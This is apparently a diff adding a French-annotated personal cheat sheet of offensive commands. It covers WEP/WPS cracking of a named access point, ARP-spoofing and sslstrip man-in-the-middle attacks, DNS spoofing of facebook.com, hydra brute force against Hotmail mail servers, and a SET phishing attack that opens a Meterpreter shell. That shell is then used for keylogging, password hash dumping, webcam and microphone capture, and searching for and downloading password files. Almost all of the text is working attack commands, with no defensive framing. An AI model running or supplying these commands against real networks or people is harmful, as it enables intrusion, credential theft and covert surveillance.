@@ -1,0 +1,117 @@
+*ADMIN :
+sudo -i
+*Vérifier carte wifi
+lsusb
+
+*Changer mode monitor
+airmon-ng
+airmon-ng check
+airmon-ng check kill
+airmon-ng start wlan0
+airmon-ng
+iwconfig
+
+*Crack WEP
+airodump-ng wlan0mon
+cd /home/kali/Desktop/attack
+airodump-ng wlan0mon --channel 10 --bssid C4:EA:1D:1F:8A:9F --write dumb
+aireplay-ng --arpreplay -e TNCAP1F8A9F wlan0mon
+aireplay-ng --deauth 0 -e TNCAP1F8A9F wlan0mon
+aireplay-ng --arpreplay -e TNCAP1F8A9F -h 8C:85:90:0C:C5:82 wlan0mon
+aircrack-ng dumb-01.cap
+
+airodump-ng wlan0mon --wps
+reaver -i wlan0mon -b C4:EA:1D:1F:8A:9F -vv
+reaver -i wlan0mon -b C4:EA:1D:1F:8A:9F -vv -p 23145696
+
+
+
+
+
+
+https://github.com/t6x/reaver-wps-fork-t6x/
+https://debian-facile.org/utilisateurs:hypathie:tutos:installer-et-utiliser-sqlite
+https://ubuntuforums.org/showthread.php?t=1287245
+
+
+
+
+apt install ettercap-graphical -y
+apt install wireshark -y
+apt install driftnet -y
+
+cat /proc/sys/net/ipv4/ip_forward
+ettercap -Tqi wlan0 -M arp:remote ////
+echo “1”> /proc/sys/net/ipv4/ip_forward
+
+
+
+Adresse ip Routeur
+/sbin/ifconfig eth0
+
+Adresse ip Publique
+curl ifconfig.me
+
+hydra -m tls -l testpass@hotmail.com -p Password -V -s 587 smtp.live.com smtp
+hydra -m tls -l testpass@hotmail.com -p Password -V -s 995 pop3.live.com pop3
+./hotmail.py  -u test@hotmail.com -w wordlist.txt
+
+################ ATTAQUE HTTP###########################
+/usr/share/ettercap/
+find / -name etter.dns
+
+service apache2 start
+
+facebook.com      A   192.168.31.128 1800
+*.facebook.com    A   192.168.31.128 3600
+www.facebook.com  PTR 192.168.31.128      # Wildcards in PTR are not allowed
+
+################ ATTAQUE HTTPS##########################
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+
+#voir le routeur
+route -n
+
+#Sniffer la cible
+nmap -sS -O 192.168.1.1/24
+arpspoof -i eth0 -t 192.168.31.144 -r 192.168.31.2
+
+sslstrip -l 8080
+
+#Attaque
+nano sslstip.log
+
+################ ATTAQUE WEBCAM##########################
+cd /pentest/exploits/SET
+./set
+2.  Website Attack Vectors
+1. The Java Applet Attack Method
+1. Web Templates
+4. Facebook
+8. Windows Meterpreter Egress Bustnoer       Spawn a meterpreter shell and find a port home via multiple ports
+2. shikata_ga_nai (Very Good)
+443
+no
+
+meterpreter > sessions -i
+meterpreter > sessions -i 1
+meterpreter > keyscan_start
+meterpreter > keyscan_dump
+meterpreter > keyscan_stop
+meterpreter > upload /etc/hack.jpg C:\
+meterpreter > getwd
+meterpreter > ls
+meterpreter > download -r password.txt
+meterpreter > record_mic
+meterpreter > record_mic -d 60
+meterpreter > webcam_list
+meterpreter > webcam_snap
+meterpreter > getsystem
+mterpreter > hashdump
+meterpreter > search -f *pass*.txt
+meterpreter > sysinfo
+meterpreter > screenshot
+meterpreter > ps
+meterpreter > migrate 724
